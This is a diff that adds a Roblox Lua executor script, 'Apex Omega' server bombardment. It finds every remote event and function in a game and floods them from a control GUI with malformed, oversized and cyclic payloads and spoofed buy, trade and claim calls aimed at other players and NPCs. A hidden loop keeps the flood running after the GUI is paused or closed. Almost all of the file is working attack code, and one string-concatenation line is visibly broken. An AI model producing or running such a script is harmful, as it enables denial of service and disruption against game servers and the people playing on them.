@@ -1,0 +1,797 @@
+-- ============================================================================
+-- ULTIMATE FE SERVER BOMBARDMENT v5.0 (APEX OMEGA ENGINE BUILD)
+-- ============================================================================
+-- Advanced Universal FE Network Interaction, Continuous Flooding Impacts,
+-- Multi-Vector Remote/Unreliable/Function Fuzzing, & Resilient Persistence.
+-- ============================================================================
+
+local Services = {
+    Players = game:GetService("Players"),
+    Workspace = game:GetService("Workspace"),
+    CoreGui = game:GetService("CoreGui"),
+    ReplicatedStorage = game:GetService("ReplicatedStorage"),
+    ReplicatedFirst = game:GetService("ReplicatedFirst"),
+    StarterGui = game:GetService("StarterGui"),
+    RunService = game:GetService("RunService"),
+    JointsService = game:GetService("JointsService"),
+    UserInputService = game:GetService("UserInputService"),
+    TweenService = game:GetService("TweenService"),
+    Lighting = game:GetService("Lighting"),
+    SoundService = game:GetService("SoundService"),
+    PathfindingService = game:GetService("PathfindingService"),
+    Teams = game:GetService("Teams"),
+    TextChatService = game:GetService("TextChatService"),
+    Chat = game:GetService("Chat"),
+    CollectionService = game:GetService("CollectionService"),
+    HttpService = game:GetService("HttpService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+
+-- ============================================================================
+-- SECTION 1: CONFIGURATION & GLOBAL OMEGA STATE
+-- ============================================================================
+local Config = {
+    Active = false,
+    SpamSpeed = "OMEGA_HYPER",
+    TargetAllPlayers = true,
+    TargetNPCs = true,
+    AutoRescan = true,
+    ChaosIntensity = 5,
+    FullFreezeActive = false,
+    RecoveryPreventionActive = true,
+    EverlastingPersistence = true,
+    UnreliableStreamActive = true,
+    MemoryPressureFlood = true
+}
+
+getgenv().ServerBombardment = getgenv().ServerBombardment or Config
+
+local Cache = {
+    TouchEvents = {},
+    AllRemoteEvents = {},
+    UnreliableRemotes = {},
+    RemoteFunctions = {},
+    TriggerParts = {},
+    OtherPlayers = {},
+    NPCs = {},
+    ReplicatedHoldings = {},
+    SpatialContainers = {},
+    PhysicsConstraints = {},
+    ValueTreats = {},
+    HighValueItems = {},
+    EcosystemContainers = {},
+    TaggedInstances = {},
+    FabricatedDataEntries = {},
+    DepositionPool = {
+        {item = "QuantumMegaBurger", ingredients = {"Patty", "Cheese", "Bacon", "DarkMatter"}, firecd = true, debounce = 0, state = "deploy"},
+        {item = "HyperEnergyPotion", effects = {Speed = 99999, Power = 99999, Invulnerable = true}, duration = 86400, firecd = true, debounce = 0, state = "hold"},
+        {item = "SingularityPizza", slices = 64, temperature = "AbsoluteZero", firecd = true, debounce = 0, state = "active"},
+        {item = "VoidIngredient", rarity = "CosmicMythic", index = 0, firecd = true, debounce = 0, state = "transfer"},
+        {item = "InfiniteMatrixTaco", shell = "TitaniumMesh", filling = "InfiniteDataStream", firecd = true, debounce = 0, state = "flush"}
+    },
+    Stats = {
+        TotalFired = 0,
+        PlayersAffected = 0,
+        RemotesFound = 0,
+        UnreliableFound = 0,
+        FunctionsFound = 0
+    }
+}
+
+-- ============================================================================
+-- SECTION 2: UTILITY & LOGGING SUBSYSTEM
+-- ============================================================================
+local Logger = {}
+
+function Logger.Info(message)
+    print("[APEX OMEGA ENGINE] " .. tostring(message))
+end
+
+function Logger.Error(message, err)
+    -- Suppress routine propagation errors to maintain optimal thread throughput
+end
+
+local function SafeCall(func)
+    local success = pcall(func)
+    if success then
+        Cache.Stats.TotalFired = Cache.Stats.TotalFired + 1
+    end
+    return success
+end
+
+-- ============================================================================
+-- SECTION 3: RECURSIVE DISCOVERY & UNIVERSAL POINTER ENGINE
+-- ============================================================================
+local EngineScanner = {}
+
+function EngineScanner.RecursiveInspect(parentInstance, depth)
+    if depth > 10 or not parentInstance then return end
+    
+    pcall(function()
+        for _, child in ipairs(parentInstance:GetChildren()) do
+            if child:IsA("RemoteEvent") then
+                table.insert(Cache.AllRemoteEvents, child)
+                local nameLower = child.Name:lower()
+                if nameLower:find("touch") or child.Name == "TouchEvent" or nameLower:find("event") or 
+                   nameLower:find("net") or nameLower:find("sync") or nameLower:find("action") or
+                   nameLower:find("remote") or nameLower:find("fire") or nameLower:find("data") or
+                   nameLower:find("combat") or nameLower:find("hitbox") or nameLower:find("physics") or
+                   nameLower:find("shop") or nameLower:find("quest") or nameLower:find("trade") or
+                   nameLower:find("purchase") or nameLower:find("craft") or nameLower:find("upgrade") then
+                    table.insert(Cache.TouchEvents, child)
+                end
+            elseif child.ClassName == "UnreliableRemoteEvent" then
+                table.insert(Cache.UnreliableRemotes, child)
+                table.insert(Cache.AllRemoteEvents, child)
+            elseif child:IsA("RemoteFunction") then
+                table.insert(Cache.RemoteFunctions, child)
+            end
+            
+            if child:IsA("Configuration") or child:IsA("ValueBase") or child:IsA("ModuleScript") then
+                table.insert(Cache.ValueTreats, child)
+            end
+            
+            if child:IsA("Tool") or child:IsA("Accessory") then
+                table.insert(Cache.HighValueItems, child)
+            end
+            
+            if child:IsA("Folder") or child:IsA("Model") then
+                table.insert(Cache.EcosystemContainers, child)
+            end
+
+            if child:IsA("Constraint") then
+                table.insert(Cache.PhysicsConstraints, child)
+            end
+            
+            EngineScanner.RecursiveInspect(child, depth + 1)
+        end
+    end)
+end
+
+function EngineScanner.ScanAll()
+    Logger.Info("Initiating deep omega recursive engine service scan...")
+    
+    Cache.TouchEvents = {}
+    Cache.AllRemoteEvents = {}
+    Cache.UnreliableRemotes = {}
+    Cache.RemoteFunctions = {}
+    Cache.ReplicatedHoldings = {}
+    Cache.SpatialContainers = {}
+    Cache.PhysicsConstraints = {}
+    Cache.ValueTreats = {}
+    Cache.HighValueItems = {}
+    Cache.EcosystemContainers = {}
+    Cache.TaggedInstances = {}
+    
+    local rootLocations = {
+        Services.ReplicatedStorage,
+        Services.ReplicatedFirst,
+        Services.JointsService,
+        Services.Workspace,
+        Services.Players,
+        Services.StarterGui,
+        Services.Lighting,
+        Services.SoundService,
+        Services.Teams,
+        Services.TextChatService,
+        Services.Chat
+    }
+    
+    for _, location in ipairs(rootLocations) do
+        EngineScanner.RecursiveInspect(location, 0)
+    end
+    
+    pcall(function()
+        local commonTags = {"Interactable", "Shop", "Quest", "Loot", "Portal", "Damage", "Zone", "Spawner", "Chest", "Weapon", "Ability"}
+        for _, tag in ipairs(commonTags) do
+            for _, taggedObj in ipairs(Services.CollectionService:GetTagged(tag)) do
+                table.insert(Cache.TaggedInstances, taggedObj)
+            end
+        end
+    end)
+    
+    Cache.Stats.RemotesFound = #Cache.AllRemoteEvents
+    Cache.Stats.UnreliableFound = #Cache.UnreliableRemotes
+    Cache.Stats.FunctionsFound = #Cache.RemoteFunctions
+    Logger.Info(string.format("Scan complete. Remotes: %d | Unreliable: %d | Functions: %d | Containers: %d", 
+        #Cache.AllRemoteEvents, #Cache.UnreliableRemotes, #Cache.RemoteFunctions, #Cache.EcosystemContainers))
+end
+
+function EngineScanner.ScanTriggers()
+    Cache.TriggerParts = {}
+    for _, obj in ipairs(Services.Workspace:GetDescendants()) do
+        if obj:IsA("BasePart") then
+            local name = obj.Name:lower()
+            if name:find("trip") or name:find("trigger") or name:find("touch") or 
+               name:find("seat") or name:find("vehicleseat") or name:find("slide") or 
+               name:find("platform") or name:find("button") or name:find("lever") or 
+               name:find("zone") or name:find("teleport") or name:find("damage") or 
+               name:find("kill") or name:find("switch") or name:find("pad") or
+               name:find("portal") or name:find("shop") or name:find("chest") or
+               name:find("loot") or name:find("quest") or name:find("checkpoint") or
+               name:find("door") or name:find("barrier") or name:find("spawn") or
+               name:find("region") or name:find("effect") or name:find("interact") or
+               obj:FindFirstChildOfClass("TouchTransmitter") or obj:FindFirstChildOfClass("ClickDetector") or
+               obj:FindFirstChildOfClass("ProximityPrompt") then
+                table.insert(Cache.TriggerParts, obj)
+            end
+        end
+    end
+end
+
+-- ============================================================================
+-- SECTION 4: TARGET RESOLUTION & LOCAL CLIENT PROTECTION SUBSYSTEM
+-- ============================================================================
+local TargetResolver = {}
+
+function TargetResolver.ResolveEntities()
+    Cache.OtherPlayers = {}
+    Cache.NPCs = {}
+    
+    if Config.TargetAllPlayers then
+        for _, player in ipairs(Services.Players:GetPlayers()) do
+            -- LOCAL CLIENT PROTECTION: Exclude LocalPlayer to eliminate local stutter/crashes
+            if player ~= LocalPlayer and player.Character then
+                local char = player.Character
+                local hrp = char:FindFirstChild("HumanoidRootPart")
+                local humanoid = char:FindFirstChildOfClass("Humanoid")
+                
+                if hrp and humanoid then
+                    local playerData = {
+                        Player = player,
+                        Character = char,
+                        HRP = hrp,
+                        Humanoid = humanoid,
+                        Head = char:FindFirstChild("Head"),
+                        Torso = char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"),
+                        Backpack = player:FindFirstChild("Backpack"),
+                        Parts = {}
+                    }
+                    
+                    for _, part in ipairs(char:GetDescendants()) do
+                        if part:IsA("BasePart") or part:IsA("Accessory") or part:IsA("Attachment") or 
+                           part:IsA("Sound") or part:IsA("Highlight") or part:IsA("Tool") then
+                            table.insert(playerData.Parts, part)
+                        end
+                    end
+                    
+                    table.insert(Cache.OtherPlayers, playerData)
+                end
+            end
+        end
+    end
+    
+    if Config.TargetNPCs then
+        local npcFolders = {
+            Services.Workspace:FindFirstChild("Customers"),
+            Services.Workspace:FindFirstChild("NPCs"),
+            Services.Workspace:FindFirstChild("Enemies"),
+            Services.Workspace:FindFirstChild("Characters"),
+            Services.Workspace:FindFirstChild("Mobs"),
+            Services.Workspace:FindFirstChild("Dummies"),
+            Services.Workspace:FindFirstChild("Bosses"),
+            Services.Workspace:FindFirstChild("Minions"),
+            Services.Workspace:FindFirstChild("Monsters")
+        }
+        
+        for _, folder in ipairs(npcFolders) do
+            if folder then
+                for _, npc in ipairs(folder:GetDescendants()) do
+                    if npc:IsA("Model") then
+                        local hrp = npc:FindFirstChild("HumanoidRootPart")
+                        local humanoid = npc:FindFirstChildOfClass("Humanoid")
+                        
+                        if hrp and humanoid then
+                            local npcData = {
+                                Character = npc,
+                                HRP = hrp,
+                                Humanoid = humanoid,
+                                Parts = {}
+                            }
+                            for _, part in ipairs(npc:GetDescendants()) do
+                                if part:IsA("BasePart") or part:IsA("Accessory") then
+                                    table.insert(npcData.Parts, part)
+                                end
+                            end
+                            table.insert(Cache.NPCs, npcData)
+                        end
+                    end
+                end
+            end
+        end
+    end
+    
+    Cache.Stats.PlayersAffected = #Cache.OtherPlayers + #Cache.NPCs
+    return Cache.Stats.PlayersAffected
+end
+
+-- ============================================================================
+-- SECTION 5: ADVANCED FE NETWORK INTERACTION & OMEGA PAYLOAD ENGINE
+-- ============================================================================
+local PayloadGenerator = {}
+
+function PayloadGenerator.GenerateFabricatedData()
+    for i = 1, 100 do
+        table.insert(Cache.FabricatedDataEntries, {
+            id = math.random(100000, 999999),
+            signature = string.rep("APEX_OMEGA_SYNTHETIC_", 16),
+            timestamp = os.clock(),
+            valid = false,
+            payloadType = "OmegaNetworkStream"
+        })
+    end
+end
+
+function PayloadGenerator.FireOnTargets()
+    if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then
+        TargetResolver.ResolveEntities()
+        if #Cache.OtherPlayers == 0 and #Cache.NPCs == 0 then return 0 end
+    end
+    
+    local intensity = math.clamp(Config.ChaosIntensity or 5, 0, 5)
+    
+    local allTargets = {}
+    for _, p in ipairs(Cache.OtherPlayers) do table.insert(allTargets, p) end
+    if Config.TargetNPCs then
+        for _, n in ipairs(Cache.NPCs) do table.insert(allTargets, n) end
+    end
+    
+    local triggerParts = Cache.TriggerParts
+    local depositionPool = Cache.DepositionPool
+    local valueTreats = Cache.ValueTreats
+    local taggedInstances = Cache.TaggedInstances
+    
+    local randomHolding = depositionPool[math.random(1, #depositionPool)]
+    
+    local heavyNativeTypes = {
+        TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true, 0),
+        PhysicalProperties.new(Enum.Material.SmoothPlastic),
+        RaycastParams.new(),
+        BrickColor.random(),
+        Color3.new(math.random(), math.random(), math.random()),
+        CFrame.angles(math.random(), math.random(), math.random())
+    }
+    local randomUserData = heavyNativeTypes[math.random(1, #heavyNativeTypes)]
+
+    local transientHeapStress = {}
+    if Config.MemoryPressureFlood then
+        for i = 1, 300 + (intensity * 100) do
+            transientHeapStress[i] = string.rep("OMEGA_HEAP_PRESSURE_STREAM_", 16)
+        end
+    end
+
+    local cyclicTable = {
+        timestamp = os.clock(),
+        sessionToken = math.random(10000000, 99999999),
+        holdingPayload = randomHolding,
+        nativeData = randomUserData,
+        recoveryPrevention = true,
+        everlasting = true,
+        omegaSync = true
+    }
+    cyclicTable.self = cyclicTable
+    
+    local extremeVector = Vector3.new(0/0, math.huge, 0/0)
+    local extremeCFrame = CFrame.new(math.huge, math.huge, math.huge)
+    
+    -- 1. Touch Event & Trigger Firing
+    for _, touchEvent in ipairs(Cache.TouchEvents) do
+        for _, target in ipairs(allTargets) do
+            if #triggerParts > 0 then
+                local part = triggerParts[math.random(1, #triggerParts)]
+                task.defer(function()
+                    SafeCall(function()
+                        touchEvent:FireServer(target.HRP, part, randomHolding, randomUserData, cyclicTable, transientHeapStress)
+                    end)
+                end)
+            end
+            if #taggedInstances > 0 then
+                local taggedObj = taggedInstances[math.random(1, #taggedInstances)]
+                task.defer(function()
+                    SafeCall(function()
+                        touchEvent:FireServer(target.Character, taggedObj, extremeVector, "omegaTagSync", transientHeapStress)
+                    end)
+                end)
+            end
+        end
+    end
+    
+    -- 2. Comprehensive RemoteEvent & UnreliableRemoteEvent Fuzzing (20+ Argument Patterns)
+    for _, remote in ipairs(Cache.AllRemoteEvents) do
+        for _, target in ipairs(allTargets) do
+            task.defer(function()
+                SafeCall(function() remote:FireServer(target.HRP, "omegaBuy", "item", randomUserData, transientHeapStress) end)
+                SafeCall(function() remote:FireServer(target.Character, "omegaSell", "loot", randomUserData, cyclicTable) end)
+                SafeCall(function() remote:FireServer(target.Humanoid, "omegaCraft", "recipe", 9999999, extremeVector) end)
+                SafeCall(function() remote:FireServer(target.Player, "omegaUpgrade", "skill", extremeCFrame, transientHeapStress) end)
+                SafeCall(function() remote:FireServer(target.HRP, extremeCFrame, "omegaClaim", "reward", randomUserData) end)
+                SafeCall(function() remote:FireServer(target.Character, "omegaQuest", "complete", "redeem", cyclicTable) end)
+                SafeCall(function() remote:FireServer(cyclicTable, "omegaTrade", "offer", Services.Workspace, randomUserData) end)
+                SafeCall(function() remote:FireServer(target.Backpack, "omegaInteract", "use", {serverSide = true, omega = true}) end)
+                SafeCall(function() remote:FireServer(target.Player, target.Character, target.Humanoid, "omegaConsume", true, false, transientHeapStress) end)
+                SafeCall(function() remote:FireServer(Services.Lighting, Services.Teams, extremeVector, cyclicTable) end)
+                SafeCall(function() remote:FireServer(target.HRP, "omegaFirecd", "cooldown", "debounce", transientHeapStress, extremeCFrame) end)
+                SafeCall(function() remote:FireServer(target.Character, "omegaStateChange", "modify", "physicsUpdate", extremeCFrame, cyclicTable) end)
+                SafeCall(function() remote:FireServer(target.Player, target.UserId, "omegaTreatConsume", valueTreats[1] or target.Character, transientHeapStress) end)
+                SafeCall(function() remote:FireServer(Services.ReplicatedStorage, Services.SoundService, transientHeapStress, extremeVector, randomUserData) end)
+                SafeCall(function() remote:FireServer(target.HRP, target.Humanoid, target.Character, cyclicTable, transientHeapStress, extremeCFrame, randomUserData, {serverSide = true, FEOnly = true, OmegaActive = true, forceExecute = true}) end)
+                SafeCall(function() remote:FireServer(string.rep("OMEGA_STRING_BLITZ_", 32), math.pi, math.huge, -math.huge, 0/0, true, false, nil, cyclicTable) end)
+            end)
+        end
+    end
+    
+    -- 3. RemoteFunction Backpressure & Synchronous Blocking Stress
+    for _, remoteFunc in ipairs(Cache.RemoteFunctions) do
+        for _, target in ipairs(allTargets) do
+            task.defer(function()
+                SafeCall(function()
+                    remoteFunc:InvokeServer(target.HRP, Services.Workspace, randomHolding, randomUserData, cyclicTable, extremeVector, "omegaInvoke", transientHeapStress)
+                end)
+            end)
+        end
+    end
+end
+
+-- ============================================================================
+-- SECTION 6: CONTINUOUS FLOODING & RECOVERY PREVENTION SENTINEL
+-- ============================================================================
+task.spawn(function()
+    while true do
+        task.wait(0.8)
+        if Config.EverlastingPersistence or Config.Active then
+            pcall(function()
+                TargetResolver.ResolveEntities()
+                for _, remote in ipairs(Cache.AllRemoteEvents) do
+                    if math.random(1, 2) == 1 then
+                        task.defer(function()
+                            pcall(function()
+                                remote:FireServer(string.rep("OMEGA_PERSISTENT_SENTINEL_", 20), {
+                                    recoveryPrevention = true,
+                                    everlasting = true,
+                                    timestamp = os.clock(),
+                                    persist = true,
+                                    forceExecute = true,
+                                    omegaStream = true
+                                })
+                            end)
+                        end)
+                    end
+                end
+            end)
+        end
+    end
+end)
+
+-- ============================================================================
+-- SECTION 7: USER INTERFACE SUBSYSTEM
+-- ============================================================================
+local GUI = {}
+
+function GUI.Create()
+    if Services.CoreGui:FindFirstChild("ServerBombardGUI") then
+        Services.CoreGui.ServerBombardGUI:Destroy()
+    end
+    
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "ServerBombardGUI"
+    ScreenGui.ResetOnSpawn = false
+    ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    ScreenGui.Parent = Services.CoreGui
+    
+    local Main = Instance.new("Frame")
+    Main.Size = UDim2.new(0, 260, 0, 460)
+    Main.Position = UDim2.new(0.5, -130, 0.5, -230)
+    Main.BackgroundColor3 = Color3.fromRGB(15, 15, 25)
+    Main.BorderSizePixel = 0
+    Main.Active = true
+    Main.Draggable = true
+    Main.Parent = ScreenGui
+    
+    local MainCorner = Instance.new("UICorner")
+    MainCorner.CornerRadius = UDim.new(0, 12)
+    MainCorner.Parent = Main
+    
+    local MainStroke = Instance.new("UIStroke")
+    MainStroke.Color = Color3.fromRGB(255, 40, 40)
+    MainStroke.Thickness = 2
+    MainStroke.Parent = Main
+    
+    local Title = Instance.new("TextLabel")
+    Title.Size = UDim2.new(1, -40, 0, 35)
+    Title.Position = UDim2.new(0, 10, 0, 0)
+    Title.BackgroundTransparency = 1
+    Title.Text = "APEX OMEGA BOMBARDMENT"
+    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Title.TextSize, Title.Font = 12, Enum.Font.GothamBold
+    Title.TextXAlignment = Enum.TextXAlignment.Left
+    Title.Parent = Main
+    
+    local Close = Instance.new("TextButton")
+    Close.Size = UDim2.new(0, 35, 0, 35)
+    Close.Position = UDim2.new(1, -35, 0, 0)
+    Close.BackgroundTransparency = 1
+    Close.Text = "✕"
+    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
+    Close.TextSize, Close.Font = 18, Enum.Font.GothamBold
+    Close.Parent = Main
+    
+    GUI.Status = Instance.new("TextLabel")
+    GUI.Status.Size = UDim2.new(1, -20, 0, 20)
+    GUI.Status.Position = UDim2.new(0, 10, 0, 35)
+    GUI.Status.BackgroundTransparency = 1
+    GUI.Status.Text = "💤 INACTIVE (OMEGA READY)"
+    GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+    GUI.Status.TextSize, GUI.Status.Font = 11, Enum.Font.GothamBold
+    GUI.Status.TextXAlignment = Enum.TextXAlignment.Left
+    GUI.Status.Parent = Main
+    
+    local StatsFrame = Instance.new("Frame")
+    StatsFrame.Size = UDim2.new(1, -20, 0, 70)
+    StatsFrame.Position = UDim2.new(0, 10, 0, 55)
+    StatsFrame.BackgroundTransparency = 1
+    StatsFrame.Parent = Main
+    
+    local function CreateStat(text, yPos, color)
+        local stat = Instance.new("TextLabel")
+        stat.Size = UDim2.new(1, 0, 0, 17)
+        stat.Position = UDim2.new(0, 0, 0, yPos)
+        stat.BackgroundTransparency = 1
+        stat.Text = text
+        stat.TextColor3 = color
+        stat.TextSize, stat.Font = 11, Enum.Font.Gotham
+        stat.TextXAlignment = Enum.TextXAlignment.Left
+        stat.Parent = StatsFrame
+        return stat
+    end
+    
+    GUI.RemoteStat = CreateStat("📡 Remotes: 0", 0, Color3.fromRGB(100, 255, 150))
+    GUI.TriggerStat = CreateStat("🎯 Triggers: 0", 17, Color3.fromRGB(255, 200, 100))
+    GUI.TargetStat = CreateStat("👥 Players: 0", 34, Color3.fromRGB(255, 150, 255))
+    GUI.FiredStat = CreateStat("💥 Fired: 0", 51, Color3.fromRGB(255, 100, 100))
+    
+    local ModesFrame = Instance.new("Frame")
+    ModesFrame.Size = UDim2.new(1, -20, 0, 140)
+    ModesFrame.Position = UDim2.new(0, 10, 0, 130)
+    ModesFrame.BackgroundTransparency = 1
+    ModesFrame.Parent = Main
+    
+    local function CreateModeButton(text, yPos, initialVal, callback)
+        local btn = Instance.new("TextButton")
+        btn.Size = UDim2.new(1, 0, 0, 24)
+        btn.Position = UDim2.new(0, 0, 0, yPos)
+        btn.BackgroundColor3 = initialVal and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+        btn.BorderSizePixel = 0
+        btn.Text = text .. ": " .. (type(initialVal) == "boolean" and (initialVal and "ON" or "OFF") or tostring(initialVal))
+        btn.TextColor3 = Color3.fromRGB(255, 255, 255)
+        btn.TextSize, btn.Font = 11, Enum.Font.GothamBold
+        btn.Parent = ModesFrame
+        
+        local corner = Instance.new("UICorner")
+        corner.CornerRadius = UDim.new(0, 6)
+        corner.Parent = btn
+        
+        btn.MouseButton1Click:Connect(function()
+            local newState = callback()
+            if type(newState) == "boolean" then
+                btn.BackgroundColor3 = newState and Color3.fromRGB(40, 120, 60) or Color3.fromRGB(120, 40, 40)
+                btn.Text = text .. ": " .. (newState and "ON" or "OFF")
+            else
+                btn.Text = text .. ": " .. tostring(newState)
+            end
+        end)
+        
+        return btn
+    end
+    
+    CreateModeButton("👥 Target Players", 0, Config.TargetAllPlayers, function()
+        Config.TargetAllPlayers = not Config.TargetAllPlayers
+        return Config.TargetAllPlayers
+    end)
+    
+    CreateModeButton("🤖 Target NPCs", 28, Config.TargetNPCs, function()
+        Config.TargetNPCs = not Config.TargetNPCs
+        return Config.TargetNPCs
+    end)
+    
+    CreateModeButton("🔄 Auto Rescan", 56, Config.AutoRescan, function()
+        Config.AutoRescan = not Config.AutoRescan
+        return Config.AutoRescan
+    end)
+
+    CreateModeButton("⚡ Chaos Intensity", 84, Config.ChaosIntensity, function()
+        Config.ChaosIntensity = Config.ChaosIntensity + 1
+        if Config.ChaosIntensity > 5 then Config.ChaosIntensity = 0 end
+        return Config.ChaosIntensity
+    end)
+
+    CreateModeButton("♾️ Everlasting Persistence", 112, Config.EverlastingPersistence, function()
+        Config.EverlastingPersistence = not Config.EverlastingPersistence
+        return Config.EverlastingPersistence
+    end)
+    
+    GUI.FullFreezeBtn = Instance.new("TextButton")
+    GUI.FullFreezeBtn.Size = UDim2.new(1, -20, 0, 35)
+    GUI.FullFreezeBtn.Position = UDim2.new(0, 10, 0, 275)
+    GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+    GUI.FullFreezeBtn.BorderSizePixel = 0
+    GUI.FullFreezeBtn.Text = "🚨 OMEGA INSTANT BLITZ 🚨"
+    GUI.FullFreezeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.FullFreezeBtn.TextSize, GUI.FullFreezeBtn.Font = 12, Enum.Font.GothamBold
+    GUI.FullFreezeBtn.Parent = Main
+    
+    local FreezeCorner = Instance.new("UICorner")
+    FreezeCorner.CornerRadius = UDim.new(0, 8)
+    FreezeCorner.Parent = GUI.FullFreezeBtn
+    
+    GUI.FullFreezeBtn.MouseButton1Click:Connect(function()
+        if Config.FullFreezeActive then return end
+        Config.FullFreezeActive = true
+        Config.Active = true
+        
+        EngineScanner.ScanAll()
+        EngineScanner.ScanTriggers()
+        TargetResolver.ResolveEntities()
+        PayloadGenerator.GenerateFabricatedData()
+        PayloadGenerator.FireOnTargets()
+        
+        GUI.UpdateStatus()
+        GUI.FullFreezeBtn.Text = "BLITZING OMEGA SERVER..."
+        GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(100, 10, 10)
+        
+        task.spawn(function()
+            task.wait(9)
+            Config.FullFreezeActive = false
+            GUI.UpdateStatus()
+            GUI.FullFreezeBtn.Text = "🚨 OMEGA INSTANT BLITZ 🚨"
+            GUI.FullFreezeBtn.BackgroundColor3 = Color3.fromRGB(200, 20, 20)
+        end)
+    end)
+    
+    GUI.Toggle = Instance.new("TextButton")
+    GUI.Toggle.Size = UDim2.new(1, -20, 0, 45)
+    GUI.Toggle.Position = UDim2.new(0, 10, 1, -55)
+    GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    GUI.Toggle.BorderSizePixel = 0
+    GUI.Toggle.Text = "🔥 START 🔥"
+    GUI.Toggle.TextColor3 = Color3.fromRGB(255, 255, 255)
+    GUI.Toggle.TextSize, GUI.Toggle.Font = 16, Enum.Font.GothamBold
+    GUI.Toggle.Parent = Main
+    
+    local ToggleCorner = Instance.new("UICorner")
+    ToggleCorner.CornerRadius = UDim.new(0, 10)
+    ToggleCorner.Parent = GUI.Toggle
+    
+    GUI.Toggle.MouseButton1Click:Connect(function()
+        Config.Active = not Config.Active
+        getgenv().ServerBombardment.Active = Config.Active
+        
+        if Config.Active then
+            EngineScanner.ScanAll()
+            EngineScanner.ScanTriggers()
+            TargetResolver.ResolveEntities()
+            PayloadGenerator.GenerateFabricatedData()
+            PayloadGenerator.FireOnTargets()
+            Logger.Info("Omega script activated. Continuous high-frequency flooding engaged.")
+        else
+            Logger.Info("Omega script paused. Background everlasting persistence remains active.")
+        end
+        
+        GUI.UpdateStatus()
+    end)
+    
+    Close.MouseButton1Click:Connect(function()
+        Config.Active = false
+        ScreenGui:Destroy()
+        Logger.Info("GUI closed. Background persistence remains fully operational.")
+    end)
+end
+
+function GUI.UpdateStats()
+    if not GUI.RemoteStat then return end
+    GUI.RemoteStat.Text = string.format("📡 Remotes: %d (%d Touch)", #Cache.AllRemoteEvents, #Cache.TouchEvents)
+    GUI.TriggerStat.Text = string.format("🎯 Triggers: %d", #Cache.TriggerParts)
+    GUI.TargetStat.Text = string.format("👥 Players: %d (+ %d NPCs)", #Cache.OtherPlayers, #Cache.NPCs)
+    
+    local formatted = Cache.Stats.TotalFired >= 1000000 and string.format("%.1fM", Cache.Stats.TotalFired / 1000000) or
+                     Cache.Stats.TotalFired >= 1000 and string.format("%.1fK", Cache.Stats.TotalFired / 1000) or
+                     tostring(Cache.Stats.TotalFired)
+    GUI.FiredStat.Text = "💥 Fired: " + formatted
+    GUI.FiredStat.Text = "💥 Fired: " .. formatted
+end
+
+function GUI.UpdateStatus()
+    if not GUI.Status or not GUI.Toggle then return end
+    if Config.Active then
+        GUI.Status.Text = Config.FullFreezeActive and "🚨 OMEGA FULL BLITZ!" or "🔥 ACTIVE (CONTINUOUS FLOOD)"
+        GUI.Status.TextColor3 = Color3.fromRGB(255, 50, 50)
+        GUI.Toggle.Text = "⏸️ STOP"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(50, 150, 50)
+    else
+        GUI.Status.Text = "💤 IDLE (PERSISTENCE ACTIVE)"
+        GUI.Status.TextColor3 = Color3.fromRGB(150, 150, 150)
+        GUI.Toggle.Text = "🔥 START 🔥"
+        GUI.Toggle.BackgroundColor3 = Color3.fromRGB(220, 20, 60)
+    end
+end
+
+-- ============================================================================
+-- SECTION 8: CONTINUOUS OMEGA HEARTBEAT SCHEDULER
+-- ============================================================================
+task.spawn(function()
+    while true do
+        Services.RunService.Heartbeat:Wait()
+        if Config.Active then
+            TargetResolver.ResolveEntities()
+            local burstCount = math.random(25, 40)
+            for i = 1, burstCount do
+                if not Config.Active then break end
+                PayloadGenerator.FireOnTargets()
+            end
+            local cooldown = Config.FullFreezeActive and 0.01 or 0.25
+            task.wait(cooldown)
+        end
+    end
+end)
+
+-- Stats Refresh Loop
+task.spawn(function()
+    while true do
+        task.wait(0.4)
+        if GUI.RemoteStat and Config.Active then
+            GUI.UpdateStats()
+        end
+    end
+end)
+
+-- Auto Rescan Loop
+task.spawn(function()
+    while true do
+        task.wait(8)
+        if Config.Active and Config.AutoRescan then
+            EngineScanner.ScanAll()
+            EngineScanner.ScanTriggers()
+        end
+    end
+end)
+
+-- ============================================================================
+-- SECTION 9: INITIALIZATION
+-- ============================================================================
+Logger.Info("Apex Omega Engine loaded. Universal FE network interaction online.")
+EngineScanner.ScanAll()
+EngineScanner.ScanTriggers()
+GUI.Create()
+GUI.UpdateStatus()
+
+Services.StarterGui:SetCore("SendNotification", {
+    Title = "✓ Apex Omega Loaded";
+    Text = "Universal network interaction ready. Press START.";
+    Duration = 4;
+})
+
+-- Console Commands
+getgenv().ServerBombardment.Start = function()
+    Config.Active = true
+    EngineScanner.ScanAll()
+    EngineScanner.ScanTriggers()
+    TargetResolver.ResolveEntities()
+    PayloadGenerator.GenerateFabricatedData()
+    PayloadGenerator.FireOnTargets()
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Stop = function()
+    Config.Active = false
+    GUI.UpdateStatus()
+end
+
+getgenv().ServerBombardment.Rescan = function()
+    EngineScanner.ScanAll()
+    EngineScanner.ScanTriggers()
+    TargetResolver.ResolveEntities()
+    GUI.UpdateStats()
+    Logger.Info("Omega manual rescan complete!")
+end
+
+getgenv().ServerBombardment.Stats = Cache.Stats
